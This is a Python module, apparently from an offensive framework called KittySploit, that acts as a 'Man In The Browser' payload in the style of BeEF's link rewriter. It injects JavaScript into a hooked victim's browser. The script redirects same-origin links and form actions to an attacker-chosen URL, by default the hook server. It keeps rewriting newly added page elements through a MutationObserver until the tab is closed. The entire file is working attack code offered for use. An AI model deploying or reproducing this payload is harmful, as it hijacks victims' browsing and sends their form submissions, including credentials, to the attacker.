from kittysploit import *
import json


class Module(BrowserAuxiliary):

	__info__ = {
		"name": "Man In The Browser",
		"description": "Rewrite same-origin links and form actions to a chosen URL (BeEF link_rewrite / MITB)",
		"author": "KittySploit Team",
		"browser": Browser.ALL,
		"platform": Platform.ALL,
		"session_type": SessionType.BROWSER,
	}

	rewrite_url = OptString("", "Destination URL for rewritten links (empty = current hook server /test)", False)
	rewrite_forms = OptBool(True, "Also rewrite form action attributes", False)
	same_origin_only = OptBool(True, "Only rewrite links pointing at the current origin", False)

	def run(self):
		rewrite_url = str(self.rewrite_url or "").strip()
		rewrite_forms = self._to_bool(self.rewrite_forms)
		same_origin_only = self._to_bool(self.same_origin_only)

		code_js = f"""
		(function() {{
			const USER_URL = {json.dumps(rewrite_url)};
			const REWRITE_FORMS = {str(rewrite_forms).lower()};
			const SAME_ORIGIN_ONLY = {str(same_origin_only).lower()};

			if (window.__ksMitb && window.__ksMitb.stop) {{
				window.__ksMitb.stop();
			}}

			let targetUrl = USER_URL;
			if (!targetUrl) {{
				let host = '127.0.0.1';
				let port = '8080';
				const proto = location.protocol || 'http:';
				if (window.kittysploit) {{
					if (typeof window.kittysploit.getServerHost === 'function') {{
						host = window.kittysploit.getServerHost();
					}}
					if (typeof window.kittysploit.getServerPort === 'function') {{
						port = String(window.kittysploit.getServerPort());
					}}
				}}
				const defaultPort = proto === 'https:' ? '443' : '80';
				const portPart = (port && port !== defaultPort) ? (':' + port) : '';
				targetUrl = proto + '//' + host + portPart + '/test';
			}}

			const pageOrigin = location.origin;

			function shouldRewrite(href) {{
				if (!href || href.indexOf('javascript:') === 0 || href.indexOf('#') === 0) {{
					return false;
				}}
				if (!SAME_ORIGIN_ONLY) return true;
				try {{
					const u = new URL(href, location.href);
					return u.origin === pageOrigin;
				}} catch (e) {{
					return href.charAt(0) === '/';
				}}
			}}

			let rewritten = 0;

			function rewriteNode(root) {{
				const scope = root || document;
				const links = scope.querySelectorAll ? scope.querySelectorAll('a[href]') : [];
				links.forEach(function(a) {{
					const href = a.getAttribute('href');
					if (shouldRewrite(href)) {{
						a.setAttribute('href', targetUrl);
						a.setAttribute('data-ks-mitb', '1');
						rewritten++;
					}}
				}});
				if (REWRITE_FORMS) {{
					const forms = scope.querySelectorAll ? scope.querySelectorAll('form[action]') : [];
					forms.forEach(function(f) {{
						const action = f.getAttribute('action');
						if (shouldRewrite(action)) {{
							f.setAttribute('action', targetUrl);
							f.setAttribute('data-ks-mitb', '1');
							rewritten++;
						}}
					}});
				}}
			}}

			rewriteNode(document);

			const observer = new MutationObserver(function(mutations) {{
				mutations.forEach(function(m) {{
					m.addedNodes.forEach(function(node) {{
						if (node.nodeType !== 1) return;
						if (node.matches && (node.matches('a[href]') || node.matches('form[action]'))) {{
							rewriteNode(node.parentNode || document);
						}} else if (node.querySelectorAll) {{
							rewriteNode(node);
						}}
					}});
				}});
			}});

			observer.observe(document.documentElement || document.body, {{
				childList: true,
				subtree: true
			}});

			window.__ksMitb = {{
				targetUrl: targetUrl,
				stop: function() {{
					observer.disconnect();
					delete window.__ksMitb;
				}}
			}};

			return JSON.stringify({{
				active: true,
				target_url: targetUrl,
				initial_rewrites: rewritten,
				rewrite_forms: REWRITE_FORMS,
				same_origin_only: SAME_ORIGIN_ONLY
			}});
		}})();
		"""

		result = self.send_js_and_wait_for_response(code_js, timeout=12.0)
		if not result:
			print_error("Failed to install MITB rewriter")
			return False

		try:
			data = json.loads(result)
		except json.JSONDecodeError:
			print_error(f"Unexpected response: {result}")
			return False

		print_success("Man-in-the-browser link rewriter active")
		print_info(f"Target URL: {data.get('target_url')}")
		print_info(f"Initial rewrites: {data.get('initial_rewrites', 0)}")
		print_warning("Persists until tab close; new DOM nodes are rewritten via MutationObserver")
		return True
